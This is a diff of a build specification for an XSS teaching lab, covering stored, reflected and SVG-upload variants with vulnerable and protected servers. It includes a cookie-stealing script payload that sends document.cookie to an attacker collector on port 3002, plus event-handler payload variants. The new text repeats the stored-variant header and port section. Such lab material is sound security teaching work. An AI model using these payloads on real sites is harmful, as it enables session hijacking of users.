@@ -779,37 +779,30 @@ Same blinking cursor / green flash / counter pattern as other demos.
 
 ---
 
-# PART 4: Comprehensive README (demo-attacked/xss/README.md)
+# PART 4: README Files
 
-Write professional technical documentation at `demo-attacked/xss/README.md`.
-Structure exactly as follows:
+Create **four** README files — one index at `xss/README.md` and one per variant.
 
-```markdown
-# XSS Attack Demonstration Lab
+---
 
-## Overview
-## Port Reference
-## Attack 1: Stored XSS — NovaCRM Support Ticket Portal
-## Attack 2: Reflected XSS — ShopNest Search Page
-## Attack 3: SVG Upload XSS — ConnectHub Profile Avatar
-## Running All Demos Simultaneously
-## Defense Summary Table
-```
+## `xss/README.md` — Lightweight index
 
-### Section: Overview
+Brief intro (2 sentences on XSS), then a variant comparison table:
 
-Two paragraphs explaining what XSS is at a high level and that this lab covers
-three distinct variants differing in persistence mechanism, delivery vector, and
-attack surface. Clarify that the SVG Upload demo's frontend code is intentionally
-clean to illustrate that XSS is not always a frontend problem.
+| Variant | Persistence | Delivery | Root cause |
+|---------|-------------|----------|------------|
+| [Stored XSS](stored/README.md) | Payload saved to DB | Automatic on every page load | `innerHTML` with unsanitized DB content |
+| [Reflected XSS](reflected/README.md) | None — URL only | Phishing link | Unencoded query param in SSR HTML |
+| [SVG Upload XSS](svg-upload/README.md) | File on disk | User opens raw file URL | File-serving policy, not frontend code |
 
-### Section: Port Reference
+Then: Port Reference table (all 9 ports), Run All Demos Simultaneously section, Defense Summary table (12 rows).
 
-Table listing all 9 servers: Port, Server name, File, Status (Vulnerable/Protected).
+---
 
-### Section: Attack 1 — Stored XSS
+## `xss/stored/README.md`
 
-Start with an **Attack Flow** code block:
+### Attack Flow
+
 ```
 Attacker posts comment containing <script>fetch('//3002?c='+document.cookie)</script>
         ↓ (stored in DB)
@@ -820,9 +813,19 @@ Victim visits the page
 Victim's browser executes the script → sends session cookie to attacker server (3002)
 ```
 
-Include subsections: What It Is, How to Run (10-step numbered list), Vulnerable Code
+Port Reference: 3001 (victim), 3002 (attacker collector), 3009 (protected victim).
+
+### Section: Port Reference
+
+Table listing all 9 servers: Port, Server name, File, Status (Vulnerable/Protected).
+
+## `xss/stored/README.md`
+
+Port Reference: 3001 (victim), 3002 (attacker collector), 3009 (protected victim).
+
+Include sections: Attack Flow (use the code block above), What It Is, How to Run (10-step numbered list), Vulnerable Code
 (exact lines with js code blocks), Why These Lines Are Dangerous, Payload Variants,
-The Fix (exact lines), Edge Cases and What Still Fails.
+The Fix (exact lines), Edge Cases and What Still Fails, This Demo in Real Frameworks (client-side rendering: React/Angular/Vue examples).
 
 **How to Run (exact steps):**
 1. Open two terminals
@@ -841,7 +844,9 @@ The Fix (exact lines), Edge Cases and What Still Fails.
 2. `<svg onload="...">` — SVG elements fire onload without a src
 3. `<body onpageshow="...">` — fires when page is shown/restored from cache
 
-### Section: Attack 2 — Reflected XSS
+## `xss/reflected/README.md`
+
+Port Reference: 3003 (victim), 3004 (attacker collector), 3008 (protected victim).
 
 Start with an **Attack Flow** code block:
 ```
@@ -854,8 +859,8 @@ Victim's browser parses response, executes injected <script>
 Session stolen → exfiltrated to attacker server (3004)
 ```
 
-Include subsections: What It Is, How to Run, Vulnerable Code (exact lines), Why These
-Lines Are Dangerous, The Fix (exact lines), Edge Cases.
+Include sections: What It Is, How to Run, Vulnerable Code (exact lines), Why These
+Lines Are Dangerous, The Fix (exact lines), Edge Cases, This Demo in Real Frameworks (SSR: Next.js/Django/Laravel examples).
 
 Include the note on URL encoding:
 > When you paste the malicious URL into a browser address bar, the browser encodes
@@ -863,7 +868,9 @@ Include the note on URL encoding:
 > returning the original `<script>` tag. This is the standard URL decode cycle.
 > It is NOT a bypass — it is how HTTP always works.
 
-### Section: Attack 3 — SVG Upload XSS
+## `xss/svg-upload/README.md`
+
+Port Reference: 3005 (victim), 3006 (attacker collector), 3007 (protected victim).
 
 Start with an **Attack Flow** code block:
 ```
@@ -877,8 +884,8 @@ Browser fetches and renders the SVG inline — executes embedded <script>
 Victim's cookie sent to attacker collector (3006)
 ```
 
-Include subsections: What It Is, How to Run, Vulnerable Code (exact lines), Why These
-Lines Are Dangerous, The Fix (4-layer stack), Edge Cases.
+Include sections: What It Is, How to Run, Vulnerable Code (exact lines), Why These
+Lines Are Dangerous, The Fix (4-layer stack), Edge Cases, This Demo in Real Frameworks (server policy is framework-agnostic).
 
 **Edge Cases to include:**
 - `<object>` and `<embed>` are NOT sandboxed like `<img>` — audit all file-loading elements
